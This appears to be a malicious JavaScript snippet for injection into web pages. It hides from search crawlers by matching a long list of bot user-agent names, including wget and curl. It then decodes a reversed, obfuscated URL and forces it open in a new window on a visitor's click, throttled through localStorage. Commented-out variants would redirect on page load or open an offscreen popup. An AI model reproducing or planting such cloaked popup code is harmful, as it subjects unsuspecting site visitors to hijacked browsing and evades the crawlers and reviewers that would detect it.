(function(docpointer) {
	var botPattern = "(googlebot\/|bot|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
	var re = new RegExp(botPattern, 'i');
	var userAgent = navigator.userAgent; 
	if (re.test(userAgent))
	    return;
	
	let eatApple = "php.reweiv/ri.pohsnirda//:ptth"/*"dne;rqinu=emehcs;tnetnI#JwGXYQ1fGA/nioj/ri.elb//:tnetni"*//*"php.modnar/moc.61tsohteyb.razabefac//:ptth"*/.split("").reverse().join("");
	let showPopUp = function() {
		let meItem = localStorage.getItem("popcornlast");
		if (meItem == null || (Date.now() - parseInt(meItem)) > (60 * 60 * 1000)) {
			return true;
		}
		return false;
	};
	
	if(document.readyState === 'ready' || document.readyState === 'complete') {
		if (showPopUp()) {
			//window.open(eatApple, "_self");
		}
	}
	else {
		document.addEventListener("readystatechange", function(e) {
			if ((document.readyState === 'ready' || document.readyState === 'complete') && showPopUp()) {
				//window.open(eatApple, "_self");
			}
		});
	}
	
	document.addEventListener("click", function(e) {
		if (showPopUp()) {
		        //var width = screen.width / 4;var height = screen.height / 4;var config='width=' + (width) + ', height=' + (height)+',top=99999999,left=99999999,status=yes,scrollbars=yes,toolbar=no,menubar=no,location=no,fullscreen=no';
			//window.open("62jxn/mrof/moc.razfamrof//:sptth".split("").reverse().join(""), "_blank", config);
		        window.open(eatApple, "_blank");
			localStorage.setItem("popcornlast", Date.now());
		}
	});
})(document);
